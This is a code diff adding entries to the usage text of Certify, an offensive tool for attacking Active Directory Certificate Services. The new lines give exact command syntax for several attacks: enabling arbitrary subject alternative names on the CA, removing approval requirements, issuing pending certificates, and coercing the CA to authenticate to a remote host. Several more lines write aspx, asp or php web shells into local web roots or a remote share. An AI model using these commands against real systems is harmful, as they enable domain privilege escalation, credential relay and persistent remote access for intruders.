@@ -59,6 +59,15 @@ namespace Certify
     Certify.exe pkiobjects [/domain:domain.local | /ldapserver:server.domain.local] [/showAdmins] [/quiet]
 
 
+  Flip the EDITF_ATTRIBUTESUBJECTALTNAME2 bit to allow SAN specification in any template:
+
+    Certify.exe setconfig /ca:SERVER\ca-name /enablesan [/removeapproval] [/restart]
+
+  Remove the need for administrator approval at the time of requesting a new certificate:
+
+    Certify.exe setconfig /ca:SERVER\ca-name /removeapproval [/enablesan] [/restart]
+
+
   Request a new certificate using the current user context:
 
     Certify.exe request /ca:SERVER\ca-name [/subject:X] [/template:Y] [/install]
@@ -76,9 +85,37 @@ namespace Certify
     Certify.exe request /ca:SERVER\ca-name /template:Y /onbehalfof:DOMAIN\USER /enrollcert:C:\Temp\enroll.pfx [/enrollcertpw:CERT_PASSWORD]
 
 
+  Issue a pending certificate:
+
+    Certify.exe issue /ca:SERVER\ca-name /id:X
+
+
   Download an already requested certificate:
 
     Certify.exe download /ca:SERVER\ca-name /id:X [/install] [/machine]
+
+
+  Coerce the CA server to perform an authentication attempt to a remote host:
+
+    Certify.exe coerceauth /ca:SERVER\ca-name /target:Target
+
+
+  Get the current CDP list. Useful to find remote writable shares:
+
+    Certify.exe writefile /ca:SERVER\ca-name /readonly
+ 
+  Write an aspx shell to a local web directory:
+
+    Certify.exe writefile /ca:SERVER\ca-name /path:C:\Windows\SystemData\CES\CA-Name\shell.aspx /input:C:\Local\Path\shell.aspx
+    
+  Write the default asp shell to a local web directory:
+
+    Certify.exe writefile /ca:SERVER\ca-name /path:c:\inetpub\wwwroot\shell.asp
+ 
+  Write a php shell to a remote web directory:
+
+    Certify.exe writefile /ca:SERVER\ca-name /path:\\remote.server\share\shell.php /input:C:\Local\path\shell.php
+
 ";
             Console.WriteLine(usage);
         }
